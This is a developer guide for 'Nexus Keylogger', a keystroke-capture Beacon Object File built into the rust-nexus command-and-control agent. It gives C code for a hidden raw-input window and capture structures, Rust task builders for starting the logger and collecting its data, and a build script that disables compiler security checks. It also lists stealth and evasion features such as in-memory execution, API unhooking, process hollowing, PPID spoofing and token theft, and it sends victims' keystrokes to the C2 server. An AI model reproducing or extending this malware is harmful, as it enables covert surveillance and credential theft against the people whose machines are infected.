# Nexus Keylogger BOF Guide

This guide covers the original keylogger implementation designed specifically for the rust-nexus C2 framework.

## Overview

The Nexus Keylogger is a Beacon Object File (BOF) that provides advanced keystroke capture capabilities integrated directly into the rust-nexus agent. Unlike standalone keyloggers, it leverages the agent's existing infrastructure for communication, evasion, and persistence.

### Key Features

- **Raw Input API**: Low-level keyboard capture using Windows Raw Input API
- **Window Context**: Automatically tracks active window titles and process information
- **BOF Integration**: Runs as a position-independent code module within the agent process
- **Secure Communication**: All data flows through the agent's encrypted grPC channel
- **Memory Safe**: Thread-safe circular buffer with proper resource management
- **Stealth Operation**: No external network connections or file artifacts

## Architecture

### Components

1. **nexus_keylogger.c**: Original C implementation with BOF entry points
2. **TaskExecutor**: Rust integration layer managing BOF lifecycle
3. **Communication Bridge**: Routes data through agent's grPC infrastructure
4. **Build System**: Automatic compilation and embedding during agent build

### Data Flow

```
Raw Keyboard Input → BOF Capture → JSON Serialization → Agent Buffer → grPC → C2 Server
```

### Differences from Original PoC

| Aspect | Original PoC | Rust-Nexus Implementation |
|--------|--------------|---------------------------|
| Communication | Direct HTTPS to Python server | Agent grPC channel |
| Execution | Standalone executable | BOF within agent process |
| Persistence | Process-based | Agent persistence mechanisms |
| Evasion | None | Agent's evasion capabilities |
| Data Format | Raw text | Structured JSON with metadata |

## BOF Implementation

### Entry Points

The keylogger BOF provides four primary entry points:

```c
DWORD keylogger_start(char* args, int length);   // Start capturing keystrokes
DWORD keylogger_stop(char* args, int length);    // Stop and cleanup
DWORD keylogger_status(char* args, int length);  // Get current status
DWORD keylogger_flush(char* args, int length);   // Flush buffered data
```

### Key Components

#### Window Management
```c
// Hidden message-only window for receiving raw input
HWND window_handle = CreateWindowExW(
    0, NEXUS_KEYLOG_CLASS_NAME, NULL, 0,
    0, 0, 0, 0, HWND_MESSAGE, NULL,
    GetModuleHandleW(NULL), NULL
);
```

#### Raw Input Registration
```c
RAWINPUTDEVICE rid = {
    .usUsagePage = HID_USAGE_PAGE_GENERIC,
    .usUsage = HID_USAGE_GENERIC_KEYBOARD,
    .dwFlags = RIDEV_INPUTSINK | RIDEV_NOLEGACY,
    .hwndTarget = window_handle
};
```

#### Data Capture
```c
// Process each keystroke with context
typedef struct {
    WCHAR window_title[NEXUS_MAX_WINDOW_TITLE];
    DWORD process_id;
    SYSTEMTIME timestamp;
    WCHAR keystroke_data[NEXUS_KEYLOG_BUFFER_SIZE];
    DWORD data_length;
} NEXUS_KEYLOG_ENTRY;
```

## Agent Integration

### Task Types

The keylogger integrates with the agent's task system through four task types:

```rust
pub enum TaskType {
    KeyloggerStart,   // Begin keystroke capture
    KeyloggerStop,    // Stop and collect data
    KeyloggerStatus,  // Check operational status
    KeyloggerFlush,   // Force data collection
}
```

### Task Builders

```rust
// Start keylogger
let task = TaskBuilder::keylogger_start();

// Check status
let task = TaskBuilder::keylogger_status();

// Collect data
let task = TaskBuilder::keylogger_flush();

// Stop keylogger
let task = TaskBuilder::keylogger_stop();
```

### State Management

```rust
struct KeyloggerState {
    loaded_bof: Option<Arc<LoadedBof>>,
    bof_loader: Arc<BOFLoader>,
    is_active: bool,
    data_buffer: Arc<Mutex<Vec<String>>>,
}
```

## Data Format

### JSON Structure

The keylogger outputs structured JSON data:

```json
{
  "type": "keylogger_data",
  "entries": [
    {
      "timestamp": "2024-12-29 19:25:30",
      "pid": 1234,
      "window": "Notepad - Untitled",
      "data": "Hello World"
    },
    {
      "timestamp": "2024-12-29 19:25:35",
      "pid": 1234,
      "window": "Notepad - Untitled", 
      "data": "[ENTER]"
    }
  ]
}
```

### Special Key Handling

- **Printable characters**: Direct Unicode translation
- **Special keys**: Formatted tokens like `[ENTER]`, `[BACKSPACE]`, `[TAB]`
- **Window changes**: Context entries showing new active window
- **Timestamps**: Precise system time for each keystroke

## Usage Examples

### Starting Keylogger

```rust
use nexus_common::tasks::TaskBuilder;

// Create start task
let start_task = TaskBuilder::keylogger_start();

// Execute through agent
let result = agent.execute_task(start_task).await?;
println!("Keylogger started: {}", result);
```

### Monitoring Status

```rust
// Check if keylogger is active
let status_task = TaskBuilder::keylogger_status();
let result = agent.execute_task(status_task).await?;

// Result contains JSON with status information
println!("Status: {}", result);
```

### Collecting Data

```rust
// Flush buffered keystrokes
let flush_task = TaskBuilder::keylogger_flush();
let result = agent.execute_task(flush_task).await?;

// Process collected keystroke data
process_keylogger_data(&result);
```

### Stopping Keylogger

```rust
// Stop keylogger and collect final data
let stop_task = TaskBuilder::keylogger_stop();
let result = agent.execute_task(stop_task).await?;

// Final data is included in the stop result
println!("Keylogger stopped: {}", result);
```

## Build System

### Automatic Compilation

The keylogger BOF is automatically compiled during the agent build process:

```rust
// build.rs
fn build_keylogger_bof() {
    let output = Command::new("cl.exe")
        .args(&[
            "/c",           // Compile only
            "/GS-",         // Disable security checks
            "/Gs9999999",   // Disable stack checking
            "/O2",          // Optimize for speed
            "/MT",          // Static runtime
            "/kernel",      // Minimal runtime
            "nexus_keylogger.c",
        ])
        .output()?;
}
```

### Embedding

The compiled BOF is embedded as a byte array:

```rust
const KEYLOGGER_BOF_DATA: &[u8] = 
    include_bytes!(concat!(env!("OUT_DIR"), "/nexus_keylogger.o"));
```

## Security Considerations

### Anti-Detection Features

1. **Memory Execution**: No files written to disk
2. **Process Integration**: Runs within legitimate agent process
3. **Minimal API Surface**: Only essential Windows APIs
4. **No Network Signatures**: Uses existing agent communication
5. **Dynamic Loading**: BOF loaded on-demand

### Operational Security

- **Data Encryption**: All keylog data encrypted in transit
- **Secure Cleanup**: Memory securely cleared on shutdown
- **Thread Safety**: Proper synchronization prevents race conditions
- **Resource Management**: Automatic cleanup prevents resource leaks

### Evasion Techniques

- **API Unhooking**: Leverages agent's API unhooking capabilities
- **Process Hollowing**: Can be deployed via agent's process hollowing
- **PPID Spoofing**: Inherits agent's parent process spoofing
- **Token Manipulation**: Uses agent's token stealing capabilities

## Troubleshooting

### Common Issues

#### BOF Compilation Fails
```
Error: cl.exe not found
Solution: Install Microsoft Visual Studio Build Tools
```

#### Keylogger Won't Start
```
Check: Windows version compatibility (Windows 7+)
Check: User privileges (may require elevation)
Check: Antivirus interference
```

#### No Data Captured
```
Check: Raw input device registration
Check: Window message pump operation  
Check: Callback function pointer validity
```

#### Memory Leaks
```
Check: Proper cleanup in keylogger_stop()
Check: Critical section unlock on all paths
Check: Window class unregistration
```

### Debug Information

Enable debug logging to troubleshoot issues:

```rust
// Set log level for keylogger debugging
RUST_LOG=nexus_agent::execution=debug cargo build
```

### Performance Monitoring

Monitor keylogger performance:

```rust
// Check buffer utilization
let status = agent.execute_keylogger_status().await?;

// Monitor memory usage
let memory_info = agent.get_process_memory_info().await?;
```

## Limitations

### Platform Support
- **Windows Only**: Uses Windows-specific Raw Input API
- **Architecture**: x64 only (could be extended to x86)
- **Version**: Requires Windows 7 or later

### Capture Limitations
- **Elevated Applications**: May not capture from higher privilege processes
- **Virtual Keyboards**: Does not capture on-screen keyboards
- **Hardware Events**: Only captures software keyboard events

### Performance Constraints
- **Buffer Size**: Limited by circular buffer capacity (64 entries)
- **Memory Usage**: Approximately 2MB when fully loaded
- **CPU Impact**: Minimal, event-driven processing only

## Advanced Usage

### Custom Data Processing

Implement custom processing for keylogger data:

```rust
impl TaskExecutor {
    pub async fn process_keylogger_data(&self, json_data: &str) -> Result<ProcessedData> {
        let data: KeyloggerData = serde_json::from_str(json_data)?;
        
        // Custom processing logic
        let processed = data.entries
            .into_iter()
            .filter(|entry| is_sensitive_data(entry))
            .map(|entry| enhance_entry(entry))
            .collect();
            
        Ok(ProcessedData { entries: processed })
    }
}
```

### Integration with Other Modules

Combine keylogger with other agent capabilities:

```rust
// Start keylogger and screen capture together
let keylogger_task = TaskBuilder::keylogger_start();
let screenshot_task = TaskBuilder::screen_capture();

// Execute in parallel
let (keylog_result, screen_result) = tokio::join!(
    agent.execute_task(keylogger_task),
    agent.execute_task(screenshot_task)
);
```

## Best Practices

### Deployment
1. **Test in controlled environment** before production use
2. **Monitor resource usage** during extended operations
3. **Implement periodic data collection** to prevent buffer overflow
4. **Use appropriate task priorities** based on operational requirements

### Data Handling
1. **Encrypt sensitive data** before transmission
2. **Implement data retention policies** to limit storage duration
3. **Sanitize logs** to prevent credential exposure in debug output
4. **Use structured formats** for easier parsing and analysis

### Operational Considerations
1. **Plan for long-term operations** with automatic data collection
2. **Implement failsafe mechanisms** for graceful degradation
3. **Consider user behavior patterns** when scheduling collection
4. **Maintain operational security** through proper task scheduling

---

For additional technical details, see the [BOF Development Guide](bof-guide.md) and [Agent Architecture Documentation](../infrastructure/README.md).
